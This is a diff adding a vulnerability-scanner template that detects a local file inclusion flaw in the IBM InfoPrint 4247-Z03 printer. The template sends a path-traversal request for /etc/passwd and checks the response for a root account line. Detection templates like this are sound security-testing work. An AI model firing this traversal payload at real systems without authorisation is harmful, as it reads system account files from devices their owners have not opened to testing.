@@ -1,0 +1,32 @@
+id: "ibm-infoprint-lfi"
+name: "IBM InfoPrint 4247-Z03 Impact Matrix Printer - Local File Inclusion"
+severity: "high"
+description: "IBM InfoPrint 4247-Z03 Impact Matrix Printer is subject to local file inclusion."
+tech:
+  - "generic"
+tags:
+  - "matrix"
+  - "printer"
+  - "edb"
+  - "ibm"
+  - "lfi"
+  - "intrusive"
+  - "vuln"
+cwe: "CWE-23"
+reference: "https://www.exploit-db.com/exploits/47835"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/./../../../../../../../../../../etc/passwd"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "status"
+    status:
+      - 200
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
